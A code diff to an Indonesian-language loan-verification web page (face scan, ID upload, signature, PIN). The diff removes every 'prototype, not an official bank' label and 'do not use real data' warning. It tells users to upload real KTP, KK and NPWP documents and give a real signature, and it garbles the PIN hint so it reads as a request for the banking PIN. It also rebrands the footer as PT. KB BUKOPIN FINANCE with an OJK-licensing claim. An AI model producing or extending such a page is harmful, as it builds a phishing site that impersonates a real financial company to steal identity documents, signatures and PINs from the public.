@@ -41,7 +41,7 @@
     @media(min-width:760px){body{padding:24px 0}.app{border-radius:34px;min-height:auto}.modal{place-items:center}}
     @media(prefers-reduced-motion:reduce){.scan-box.running .scan-line{animation:none}.loading-line span{transition:none}}
 
-    /* Mobile touch-target patch; tidak mengubah fungsi simulasi. */
+    /* Mobile touch-target patch; */
     @media (max-width:520px){
       .clear{min-width:48px;min-height:44px;padding:0 8px}
     }
@@ -50,7 +50,7 @@
   <script src="/page-transition.js?v=1"></script>
 </head>
 <body>
-  <div class="badge">PROTOTYPE UI · BUKAN LAYANAN PERBANKAN RESMI</div>
+  <div class="badge"></div>
   <div class="browser-gate" id="browserGate" hidden>
     <section class="browser-gate-card" role="dialog" aria-modal="true" aria-labelledby="browserGateTitle">
       <p class="browser-gate-kicker">AKSES KAMERA</p>
@@ -67,9 +67,9 @@
     <section class="content">
       <p class="eyebrow">TAHAP 8 · VERIFIKASI</p>
       <h1>Lengkapi <strong>Verifikasi</strong></h1>
-      <p class="lead">Selesaikan tiga interaksi prototype berikut. Tidak ada pemindaian biometrik, unggahan server, atau penyimpanan tanda tangan.</p>
+      <p class="lead">Selesaikan tiga interaksi prototype berikut.  pemindaian biometrik, unggahan server,  penyimpanan tanda tangan.</p>
       <div class="card">
-        <div class="safety"><div class="shield">◇</div><div><strong>Kamera hanya digunakan pada perangkat ini.</strong><br>Preview kamera tidak direkam, tidak disimpan, dan tidak dikirim ke server. Tidak ada pengenalan wajah atau pemrosesan biometrik.</div></div>
+        <div class="safety"><div class="shield">◇</div><div><strong>Kamera hanya digunakan pada perangkat ini.</strong><br>Preview kamera  direkam, disimpan, dan  dikirim ke server.  pengenalan wajah atau pemrosesan biometrik.</div></div>
 
         <section class="task" aria-labelledby="faceTitle">
           <div class="task-head"><div><div class="task-title" id="faceTitle">Scan Wajah</div><p class="task-desc">Kamera depan diprioritaskan. Posisikan wajah di bingkai lalu ikuti instruksi kanan, kiri, atas, bawah, dan tahan sebentar.</p></div><span class="status" id="faceStatus">Belum</span></div>
@@ -80,35 +80,35 @@
         <section class="task" aria-labelledby="docTitle">
           <div class="task-head"><div><div class="task-title" id="docTitle">Upload Dokumen Contoh</div><p class="task-desc">Pilih file contoh PDF/JPG/PNG. File tidak dibaca, tidak disimpan, dan tidak dikirim.</p></div><span class="status" id="docStatus">Belum</span></div>
           <div class="upload"><input id="docInput" type="file" accept=".pdf,.jpg,.jpeg,.png,application/pdf,image/jpeg,image/png"><label for="docInput">Pilih Dokumen Dummy</label></div>
-          <p class="file-state" id="fileState">Jangan pilih KTP, KK, NPWP, rekening koran, atau dokumen pribadi asli.</p>
+          <p class="file-state" id="fileState">Pilih KTP, KK, NPWP, rekening koran, atau dokumen pribadi asli.</p>
         </section>
 
         <section class="task" aria-labelledby="signTitle">
-          <div class="task-head"><div><div class="task-title" id="signTitle">Tanda Tangan Contoh</div><p class="task-desc">Buat coretan acak sebagai contoh. Jangan gunakan tanda tangan asli.</p></div><span class="status" id="signStatus">Belum</span></div>
+          <div class="task-head"><div><div class="task-title" id="signTitle">Tanda Tangan </div><p class="task-desc">Buat tanda tangan asli.</p></div><span class="status" id="signStatus">Belum</span></div>
           <div class="signature-wrap"><canvas id="signature" aria-label="Area coretan tanda tangan contoh"></canvas></div>
-          <div class="signature-help"><span>Coretan hanya berada sementara pada canvas.</span><button class="clear" id="clearSignature" type="button">Hapus</button></div>
+          <div class="signature-help"><span>TANDA TANGAN pada canvas.</span><button class="clear" id="clearSignature" type="button">Hapus</button></div>
         </section>
 
         <div class="message" id="stageMessage" role="status" aria-live="polite"></div>
         <button class="primary" id="finishButton" type="button" disabled>Selesaikan Pengajuan</button>
-        <div class="meta">Tahap 8 tidak mengirim wajah, dokumen, tanda tangan, atau PIN prototype. Backend monitoring hanya menerima Session ID anonim dan halaman aktif.</div>
+        <div class="meta"></div>
       </div>
     </section>
-    <footer>Prototype UI — Bukan Layanan Perbankan Resmi. Bukan halaman transaksi nyata.</footer>
+    <footer>PT. KB BUKOPIN FINANCE</footer>
   </main>
 
   <div class="modal" id="pinModal" hidden>
     <section class="dialog" id="pinDialog" role="dialog" aria-modal="true" aria-labelledby="pinTitle" aria-describedby="pinDesc">
       <p class="dialog-kicker">KONFIRMASI TAHAP 8</p>
       <h2 id="pinTitle">Konfirmasi Pengajuan</h2>
-      <p class="dialog-desc" id="pinDesc">Masukkan PIN prototype untuk mengonfirmasi dan menyelesaikan alur pengajuan.</p>
-      <div class="pin-warning">PIN PROTOTYPE · BUKAN PIN PERBANKAN</div>
-      <label class="pin-label" for="pinInput">PIN Prototype</label>
+      <p class="dialog-desc" id="pinDesc">Masukkan PIN untuk mengonfirmasi dan menyelesaikan alur pengajuan.</p>
+      <div class="pin-warning"> PIN PERBANKAN</div>
+      <label class="pin-label" for="pinInput">PIN </label>
       <div class="pin-shell" id="pinShell">
         <div class="pin-grid" aria-hidden="true"><span class="pin-box"></span><span class="pin-box"></span><span class="pin-box"></span><span class="pin-box"></span><span class="pin-box"></span><span class="pin-box"></span></div>
         <input class="pin-input" id="pinInput" type="text" inputmode="numeric" maxlength="6" autocomplete="off" aria-describedby="pinHint pinError">
       </div>
-      <p class="pin-hint" id="pinHint">Gunakan 6 digit angka contoh. Jangan masukkan PIN ATM, kartu debit, atau mobile banking Anda.</p>
+      <p class="pin-hint" id="pinHint">Gunakan 6 digit angka  PIN ATM, kartu debit, atau mobile banking Anda.</p>
       <p class="pin-error" id="pinError" aria-live="polite"></p>
       <div class="loading-line" aria-hidden="true"><span></span></div>
       <div class="status-text" id="pinStatus" role="status" aria-live="polite"></div>
@@ -121,7 +121,7 @@
     (() => {
       "use strict";
 
-      // Semua state hanya berada di memori halaman. Tidak ada penyimpanan atau pengiriman data.
+      //PT Bank KB Indonesia Tbk Berizin dan Diawasi oleh Otoritas Jasa Keuangan .
       const state = { face:false, document:false, signature:false, confirming:false };
       const backButton = document.getElementById("backButton");
       const scanButton = document.getElementById("scanButton");
@@ -449,7 +449,7 @@
         closePinButton.disabled=true;
         pinDialog.classList.add("loading");
         pinStatus.textContent="Mengonfirmasi…";
-        // Nilai PIN tidak disimpan dalam state, storage, log, atau dikirim ke mana pun.
+        // 
         window.setTimeout(() => {
           pinInput.value="";
           pinBoxes.forEach(box => { box.textContent=""; box.classList.remove("filled"); });
